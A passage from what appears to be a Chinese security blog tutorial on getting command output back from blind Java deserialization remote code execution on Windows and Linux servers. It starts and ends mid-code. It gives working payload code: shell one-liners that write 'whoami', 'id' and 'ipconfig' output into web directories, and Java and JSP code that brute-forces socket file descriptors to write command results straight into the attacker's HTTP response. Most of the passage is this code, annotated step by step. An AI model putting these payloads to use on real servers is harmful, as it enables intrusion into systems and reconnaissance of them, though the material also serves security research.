       outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(output));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        response.getWriter().write(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​     在自己的VPS上开启LDAP服务，执行结果如下</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152936908.png" alt="image-20201221152936908"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152826165.png" alt="image-20201221152826165"></p>
<h3 id="Windows回显"><a href="#Windows回显" class="headerlink" title="Windows回显"></a>Windows回显</h3><h4 id="执行结果写入web目录"><a href="#执行结果写入web目录" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        当我们在一些web网站测试过程中遇到了没有回显的命令执行漏洞，可以通过将命令执行结果写入到web目录下的文件的方式获取回显，首先要解决一个问题是怎么才能找到当前网站的目录呢？可以通过<code>dir /s /b e:\web.xml</code>这种方式获取e盘下所有的web.xml的目录。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162728556.png" alt="image-20201221162728556"></p>
<p>​        其次我们可以将我们命令执行的结果循环写入到找到的这些文件的目录中，利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c &quot;for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b e:tomcat.css&#39;) do (echo %i&gt; %i.path.txt) &amp; (ipconfig &gt; %i.cmd.txt)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162905061.png" alt="image-20201221162905061"></p>
<p>​        如果是通过GET方式进行利用，需要将请求的内容编码，否则会下入不成功。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163149040.png" alt="image-20201221163149040"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163227146.png" alt="image-20201221163227146"></p>
<p>​        由于使用这种方式写入回显会向匹配到的结果循环写入文件，所以我们在选择要匹配的文件名的时候，尽量选择一些不容易和其他项目重复的文件名。</p>
<h4 id="socket文件描述符回显"><a href="#socket文件描述符回显" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        对服务端发起请求时会对应一个socket的文件描述符，我们可以获得当前请求的文件描述符，并在相应中写入回显内容。使用这种方法我们需要明白两个问题</p>
<ul>
<li><p>如何在java中获取当前的socket文件描述符？</p>
<p>目前没有比较好的方法可以获取到当前请求的文件描述符,一般是通过暴力枚举文件操作符，再通过某些方式判断枚举的文件描述符是否有效，可以通过sun.nio.ch.Net#remoteAddress验证文件操作符是否有效，最后通过一些条件比如请求IP来过滤文件操作符是否来自于本次请求。</p>
</li>
<li><p>如何向socket文件描述符写入数据？</p>
<p>可以通过FileOutputStream或其子类写入回显数据。</p>
<p>参考<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Windows/code/WindowsEcho.jsp</code>测试类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField("fd");</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>);</span><br><span class="line">            java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            write.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">            java.util.List list = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">            java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123;</span><br><span class="line">                field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;);</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    list.add(<span class="keyword">new</span> Integer(i));</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    field.set((Object)fileDescriptor, list.get(i));</span><br><span class="line">                    Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;);</span><br><span class="line">                    String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;</span><br><span class="line">                    String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim();</span><br><span class="line">                    String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;</span><br><span class="line">                    write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221183135520.png" alt="image-20201221183135520"></p>
<p>​    我将上面的代码分为几段来讲解,先看一下第一段的代码，代码的说明我会写到注释中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field field =java.io.FileDescriptor.class.getDeclaredField("fd");  //通过反射获取FileDescriptor的fd属性，</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);  <span class="comment">//由于fd属性是private，因此需要设置访问权限才能正常使用</span></span><br><span class="line">Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>); <span class="comment">//获取Net类的Class对象</span></span><br><span class="line">java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//获取sun.nio.ch.Net#remoteAddress方法</span></span><br><span class="line">method1.setAccessible(<span class="keyword">true</span>); <span class="comment">//由于remoteAddress方法不是public所以需要设置访问权限才能调用</span></span><br><span class="line">java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">java.util.List list = <span class="keyword">new</span> java.util.ArrayList(); <span class="comment">//创建一个list列表，用来存储可以满足需求的文件描述符ID</span></span><br><span class="line">java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor(); <span class="comment">//创建fileDescriptor对象</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123; <span class="comment">//循环遍历文件描述符ID</span></span><br><span class="line">          field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));<span class="comment">//设置fd属性的值为i</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;); <span class="comment">//通过反射调用sun.nio.ch.Net#remoteAddress方法，并传入fileDescriptor对象。</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>; <span class="comment">//当通过remoteAddress获取的内容包含127.0.0.1是，也就是这个请求时127.0.0.1则排除</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">      list.add(<span class="keyword">new</span> Integer(i)); <span class="comment">//满足条件则添加</span></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们看一下remoteAddress是如何验证socket是否存在的？</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193820631.png" alt="image-20201221193820631"></p>
<p>​    在remoteInetAddress方法中，会通过我们传入的FileDescriptor的值判断socket是否存在，当不存在是会抛出socket异常。</p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193915547.png" alt="image-20201221193915547"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194018415.png" alt="image-20201221194018415"></p>
<p>​        remoteInetAddress的实现在native层，也就是C来实现的，如果想要查看对应的C代码可以下载Openjdk来查看，remoteInetAddress的实现代码如下，在remoteInetAddress中会调用getpeername来获取socket的ip和端口号，获取失败则会pa</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222095043479.png" alt="image-20201222095043479"></p>
<p>​        如果remoteInetAddress方法可以正常获取，则返回InetSocketAddressHolder对象，在这个对象中包含hostname,addr,port等信息。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194132910.png" alt="image-20201221194132910"></p>
<p>​        我们再看下第二段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="keyword">true</span>); <span class="comment">//通过反射调用获取SocketOutputStream的构造器</span></span><br><span class="line"></span><br><span class="line">Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//通过反射获取PlainSocketImpl的有参构造器。</span></span><br><span class="line">constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;  <span class="comment">//调用java.net.SocketOutputStream#write方法，并传入byte[]数组</span></span><br><span class="line"> write.setAccessible(<span class="keyword">true</span>); <span class="comment">//更改write方法的访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123; <span class="comment">//循环向所有满足条件的socket中写入命令执行的结果。</span></span><br><span class="line">     <span class="keyword">try</span>&#123;</span><br><span class="line">       field.set((Object)fileDescriptor, list.get(i)); <span class="comment">//设置fileDescriptor的fd属性</span></span><br><span class="line"> Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;); <span class="comment">//通过反射创建socketOutputStream实例并传入PlainSocketImpl的实例。</span></span><br><span class="line">     String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;  </span><br><span class="line">     String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim(); <span class="comment">//命令执行结果</span></span><br><span class="line">     String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;  <span class="comment">//将命令执行的结果和响应头的部分拼接</span></span><br><span class="line">      write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">//调用socketOutputStream的write方法写入命令执行结果。</span></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        socketOutputStream的构造参数需要传入AbstractPlainSocketImpl类型的参数。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200058463.png" alt="image-20201221200058463"></p>
<p>​        而PlainSocketImpl是AbstractPlainSocketImpl的子类，因此其返回的实例可以作为socketOutputStream的参数传入。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200144137.png" alt="image-20201221200144137"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200243072.png" alt="image-20201221200243072"></p>
<p>​        为什么我们的写入socket数据的时候需要加入HTTP响应头？</p>
<p>​        我们抓包进行分析，可以看到我们写入的内容在真实的请求头之前，所以在我们写入数据时需要先添加一个请求头避免无法正常响应。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200405698.png" alt="image-20201221200405698"></p>
<h3 id="Linux回显"><a href="#Linux回显" class="headerlink" title="Linux回显"></a>Linux回显</h3><h4 id="执行结果写入web目录-1"><a href="#执行结果写入web目录-1" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        这种实现方法和windows的方法类似，也是通过查找某些指定的文件名的位置，并将命令执行的结果写入到找到的文件目录中,运行如下命令，可以将命令执行的结果写入到web.xml同级目录下的test.txt中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name web.xml|while read f;do sh -c 'id;pwd;ifconfig' &gt;$(dirname $f)/test.txt;done</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222102651892.png" alt="image-20201222102651892"></p>
<h4 id="socket文件描述符回显-1"><a href="#socket文件描述符回显-1" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        在Linux中，可以通过命令来查看文件描述符从而获取到socket的连接信息,<code>cat /proc/net/tcp</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222110758528.png" alt="image-20201222110758528"></p>
<p>​        假如我们通过<code>nc -lvvp 8888</code>开启一个监听，我们如何找到对应的socket连接，首先<code>ps -elf|grep nc</code> 找到监听对应的进程ID。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145124269.png" alt="image-20201222145124269"></p>
<pre><code>根据进程ID找到对应的socket文件，socket后的数字代表INode</code></pre><p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145240659.png" alt="image-20201222145240659"></p>
<p>​        最后，我们就可以根据找到的Inode的信息找到对应的socket，<code>cat /proc/net/tcp|grep 2664048</code>并且可以获取源端口和地址还有目的端口和地址。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145717578.png" alt="image-20201222145717578"></p>
<p>​        我们也可以根据请求的端口来找到对应的socket的Inode <code>cat /proc/net/tcp|awk &#39;{if($10&gt;0)print}&#39;|grep -i 125D|awk &#39;{print $10}&#39;</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151828714.png" alt="image-20201222151828714"></p>
<p>​        再根据Inode和进程id来获取fd也就是socket文件描述符的值<code>ls -l /proc/32591/fd|grep 2664048|awk &#39;{print $9}&#39;</code>。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151905568.png" alt="image-20201222151905568"></p>
<p>​        我们分析一下<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Linux/code/case2.jsp</code>的实现,首先看一下执行结果，基本上可以稳定的获取到回显的结果。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222152243073.png" alt="image-20201222152243073"></p>
<p>​        代码实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">        String command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN&#123;FS=\"[\"&#125;''&#123;print $2&#125;'|sed 's/.$//'"</span>;  <span class="comment">//获取当前所有的Inode的值</span></span><br><span class="line">        String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res1 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        String line = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res1.add(line);  <span class="comment">//将所有的Inode添加到一个列表中</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep((<span class="keyword">long</span>)<span class="number">2000</span>); <span class="comment">//延时2秒</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">//pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk '&#123;print $9, $11&#125;'"</span>; <span class="comment">//获取延时2秒后的Inode和fd属性，理论上来讲应该和第一次获取的Inode不一样，但是无论是第一次获取的Inode还是延迟后获取的Inode都会包含我们本次请求的socket对应的Inode</span></span><br><span class="line">        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        br = <span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        java.util.List res2 = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span> &amp;&amp; !line.trim().isEmpty())&#123;</span><br><span class="line">            res2.add(line);  <span class="comment">//获取延迟2秒后的socket的Inode</span></span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res2.size(); i++)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                String socketNo = ((String)res2.get(i)).split(<span class="string">"\\s+"</span>)[<span class="number">1</span>].substring(<span class="number">8</span>); <span class="comment">//从res2中得到Inode</span></span><br><span class="line">                socketNo = socketNo.substring(<span class="number">0</span>, socketNo.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res1.size(); j++)&#123; </span><br><span class="line">                    <span class="keyword">if</span>(!socketNo.equals(res1.get(j))) <span class="keyword">continue</span>; <span class="comment">//判断延迟后的Inode是否在第一次请求的Inode中，如果不在则说明是新建立的socket，如果在则有可能是我们本次请求的socket。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(Integer.parseInt(socketNo) &gt; max) &#123; <span class="comment">//判断获取的Inode是否是最大的，如果是最大的，也就代表最新的一个socket，则有可能是我们请求的socket。</span></span><br><span class="line">                        max = Integer.parseInt(socketNo);</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                <span class="comment">//pass</span></span><br><span class="line">            &#125;</span><br><span class="line">        